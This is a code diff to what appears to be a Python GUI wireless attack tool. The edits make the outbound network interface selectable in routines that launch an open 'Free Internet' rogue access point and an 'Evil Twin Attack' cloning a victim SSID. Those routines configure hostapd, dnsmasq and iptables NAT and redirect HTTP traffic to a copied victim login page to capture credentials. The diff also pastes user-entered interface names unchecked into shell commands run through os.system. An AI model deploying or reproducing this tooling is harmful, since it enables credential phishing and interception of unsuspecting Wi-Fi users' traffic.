@@ -641,8 +641,19 @@ sh /usr/local/etc/raddb/certs/bootstrap'''
 	def free_evil(self, e):
 		net_ifaces = wless_commands.get_net_devices()
 		wlan_ifaces = wless_commands.get_monitoring_interfaces()
-		if 'eth0' not in net_ifaces:
-			wx.MessageBox('make sure you have eth0 interface',
+		
+		def ask(parent=None, message='', default_value=''):
+			dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
+			dlg.ShowModal()
+			result = dlg.GetValue()
+			dlg.Destroy()
+			return result
+			
+		
+		
+		internet_iface = str(ask(message = 'Enter Outbound Internet Interface.\ni.e. eth0, eth1, eth2')).strip()
+		if internet_iface not in net_ifaces:
+			wx.MessageBox('make sure you have network interface',
 					'Warning/Error', wx.ICON_ERROR | wx.ICON_INFORMATION)
 			return
 		elif not wlan_ifaces:
@@ -653,17 +664,17 @@ sh /usr/local/etc/raddb/certs/bootstrap'''
 		wlan_iface = wlan_ifaces[0]
 		wless_commands.bring_wlan_devs_up([wlan_iface])
 
-		os.system("ifconfig eth0 up")
-		print 1
+		os.system("ifconfig "+internet_iface+" up")
+		#~ print 1
 
 		hostapd = open('hostapd-freenet.conf', 'wb')
 		#~ config_file = "interface="+wireless_interface+"\ndriver=nl80211\nssid=thisisme\nchannel=1\n#enable_karma=1\n"
 		config_file = "interface="+wlan_iface+"\ndriver=nl80211\nssid=Free Internet\nchannel=1\n#enable_karma=1\n"
 		hostapd.write(config_file)
 		hostapd.close()
-		print 2
+		#~ print 2
 		os.system("gnome-terminal -x hostapd hostapd-freenet.conf &")
-		print 3
+		#~ print 3
 		os.system("""sed -i 's#^DAEMON_CONF=.*#DAEMON_CONF=/etc/hostapd/hostapd.conf#' /etc/init.d/hostapd
 		cat <<EOF > /etc/dnsmasq.conf
 log-facility=/var/log/dnsmasq.log
@@ -676,7 +687,7 @@ dhcp-option=6,10.0.0.1
 #no-resolv
 log-queries
 EOF"""%wlan_iface)
-		print 4
+		#~ print 4
 
 		os.system("service dnsmasq start")
 
@@ -684,9 +695,17 @@ EOF"""%wlan_iface)
 		ifconfig """+wlan_iface+""" 10.0.0.1/24
 		iptables -t nat -F
 		iptables -F
-		iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
-		iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
+		iptables -t nat -A POSTROUTING -o """+internet_iface+""" -j MASQUERADE
+		iptables -A FORWARD -i """+wlan_iface+""" -o """+internet_iface+""" -j ACCEPT
 		echo '1' > /proc/sys/net/ipv4/ip_forward""")
+		
+		#~ print """ifconfig """+wlan_iface+""" up
+		#~ ifconfig """+wlan_iface+""" 10.0.0.1/24
+		#~ iptables -t nat -F
+		#~ iptables -F
+		#~ iptables -t nat -A POSTROUTING -o """+internet_iface+""" -j MASQUERADE
+		#~ iptables -A FORWARD -i """+wlan_iface+""" -o """+internet_iface+""" -j ACCEPT
+		#~ echo '1' > /proc/sys/net/ipv4/ip_forward"""
 
 		wx.MessageBox('Free Internet SSID is launched', 'Info', wx.OK | wx.ICON_INFORMATION)
 
@@ -1315,6 +1334,7 @@ class EvilWindow(wx.Frame):
 
     def __init__(self,parent,id):
 		
+		
         wx.Frame.__init__(self, parent, id, 'New Window', size=(600,300))
         wx.Frame.CenterOnScreen(self)
         #self.new.Show(False))
@@ -1324,17 +1344,45 @@ class EvilWindow(wx.Frame):
         hbox.Add(self.listbox, 1, wx.EXPAND | wx.ALL, 20)
         btnPanel = wx.Panel(panel, -1)
         vbox = wx.BoxSizer(wx.VERTICAL)
-       
+        global outboutiface 
+        global cb
+        outboutiface = ''
+         
         select = wx.Button(btnPanel, -1, 'Select SSID', size=(100, 30))
+        
+        ############# get Internet interface card ########
+        test = subprocess.Popen(["ls", "/sys/class/net/"], stdout=subprocess.PIPE)
+        (out,err) = test.communicate()
+        mylist= out.split()
+        ############# get Internet interface card ########
+               
+		#~ select = wx.Button(btnPanel, -1, 'Select SSID', size=(100, 30))
+		#~ test = subprocess.Popen(["ls", "/sys/class/net/"], stdout=subprocess.PIPE)
+		#~ (out,err) = test.communicate()
+		#~ mylist= out.split()
+		
+        
+        cb = wx.ComboBox(btnPanel, -1,choices=mylist, style=wx.CB_READONLY,size=(100, 30))
+        #~ cb.SetSelection(cb.GetValue())
+        
+        #~ global outboutiface
+        
+        
+        st = wx.StaticText(btnPanel, -1, label='Select Outbund\nInterface')
         attack = wx.Button(btnPanel, -1, 'Attack', size=(100, 30))
         
         self.Bind(wx.EVT_BUTTON, self.ScanW, id=-1)
         
         attack.Bind(wx.EVT_BUTTON, self.attack_W)
         
+        
+        
         #self.Bind(wx.EVT_LISTBOX_DCLICK, self.OnRename)
         vbox.Add((-1, 20))
         vbox.Add(select)
+        vbox.Add(st)
+        vbox.Add(cb)
+        
         vbox.Add(attack)
         
         btnPanel.SetSizer(vbox)
@@ -1389,14 +1437,31 @@ log-queries
 			os.system("service dnsmasq start")
 
 			iface = wless_commands.get_monitoring_interfaces()[0]
+			
+			#~ myoutbound_interface = cb.GetValue()
+			#~ print 'Current fake AP combo box is ' + str(outboutiface)
+			global outboutiface
+			global cb
+			outboutiface = cb.GetValue()
+			 
 			os.system("""ifconfig %s up
 			ifconfig %s 10.0.0.1/24
 
 			iptables -t nat -F
 			iptables -F
-			iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
-			iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
-			echo '1' > /proc/sys/net/ipv4/ip_forward"""%(iface, iface))
+			iptables -t nat -A POSTROUTING -o %s -j MASQUERADE
+			iptables -A FORWARD -i wlan0 -o %s -j ACCEPT
+			echo '1' > /proc/sys/net/ipv4/ip_forward"""%(iface, iface,outboutiface,outboutiface))
+			
+			print """ifconfig %s up
+			ifconfig %s 10.0.0.1/24
+
+			iptables -t nat -F
+			iptables -F
+			iptables -t nat -A POSTROUTING -o %s -j MASQUERADE
+			iptables -A FORWARD -i wlan0 -o %s -j ACCEPT
+			echo '1' > /proc/sys/net/ipv4/ip_forward"""%(iface, iface,outboutiface,outboutiface)
+			
 			######## Debugging purpose
 			print 'IP table is created'
 			
@@ -1407,8 +1472,10 @@ log-queries
 		app_select = text_split[0].replace("['SSID:","").replace("'","").strip()
 		##### remove ['SSID: 
 		self.evil_twin_attack(app_select)
-		
-		
+		global outboutiface
+		global cb
+		outboutiface = cb.GetValue()
+		print 'current interface is ' + str(outboutiface)
 		
 		wx.MessageBox('Evil Twin Attack on '+str(text)+' is started', 'Info', wx.OK | wx.ICON_INFORMATION)
 		######## close the child frame
@@ -1561,7 +1628,12 @@ class infernal_wireless(wx.Frame):
       panel = wx.Panel(self,-1)
       wx.StaticText(panel, -1, 'Currently, fully page download automation is not \nfully implemented.\nPlease connect to victim SSID and save the login page as \n/var/www/login.html and change permission to 755\n for all web contents you downloaded\nAnd press the button below to proceed to attack')
       ifcbtn = wx.Button(panel, label='Execute Infernal  ', pos=(20,150))
-      ifcbtn.Bind(wx.EVT_BUTTON, self.executeInfernal)
+      
+      try:
+		  ifcbtn.Bind(wx.EVT_BUTTON, self.executeInfernal)
+      except:
+		  wx.MessageBox('Make sure to save the login page under Apache public folder\ni.e. /var/www/html or /var/www/', 'Warning', wx.ICON_ERROR | wx.ICON_INFORMATION)
+		  
       
       self.bSoup = wx.TextCtrl(panel, -1, "", style=wx.TE_MULTILINE,pos=(30, 200),size=(500,350))
 
@@ -1645,6 +1717,8 @@ class infernal_wireless(wx.Frame):
 			user = str(ask(message = 'Enter Username')).strip()
 			password = str(ask(message = 'Enter Password')).strip()
 			ssid = str(ask(message = 'Enter the SSID')).strip()
+			wlanInterface = str(ask(message = 'Enter the WLAN Interface Name')).strip()
+			OutboundInterface = str(ask(message = 'Enter the Outbound Interface Name \nwhere Internet connection exists')).strip()
 			
 
 
@@ -1673,13 +1747,26 @@ class infernal_wireless(wx.Frame):
 log-facility=/var/log/dnsmasq.log
 #address=/#/10.0.0.1
 #address=/google.com/10.0.0.1
-interface=wlan0
+interface=%s
 dhcp-range=10.0.0.10,10.0.0.250,12h
 dhcp-option=3,10.0.0.1
 dhcp-option=6,10.0.0.1
 #no-resolv
 log-queries
-EOF""")
+EOF"""%wlanInterface)
+
+			print """sed -i 's#^DAEMON_CONF=.*#DAEMON_CONF=/etc/hostapd/hostapd.conf#' /etc/init.d/hostapd
+			cat <<EOF > /etc/dnsmasq.conf
+log-facility=/var/log/dnsmasq.log
+#address=/#/10.0.0.1
+#address=/google.com/10.0.0.1
+interface=%s
+dhcp-range=10.0.0.10,10.0.0.250,12h
+dhcp-option=3,10.0.0.1
+dhcp-option=6,10.0.0.1
+#no-resolv
+log-queries
+EOF"""%wlanInterface
 
 			os.system("service dnsmasq start")
 
@@ -1714,7 +1801,7 @@ EOF""")
 			iptables --delete-chain
 			iptables --table nat --delete-chain
 			echo 1 > /proc/sys/net/ipv4/ip_forward
-			iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+			iptables --table nat --append POSTROUTING --out-interface """+OutboundInterface+""" -j MASQUERADE
 			iptables --append FORWARD --in-interface at0 -j ACCEPT
 			iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
 			iptables -t nat -A POSTROUTING -j MASQUERADE""")
@@ -1729,8 +1816,11 @@ EOF""")
 			#~ echo '1' > /proc/sys/net/ipv4/ip_forward""")
 			#~ print "finished the setup of nat"
 			
+		try:
+			get_login_page()
+		except:
+			wx.MessageBox('Make sure to save the login page under Apache public folder\ni.e. /var/www/html or /var/www/', 'Warning', wx.ICON_ERROR | wx.ICON_INFORMATION)
 			
-		get_login_page()
 
 	
 def main():
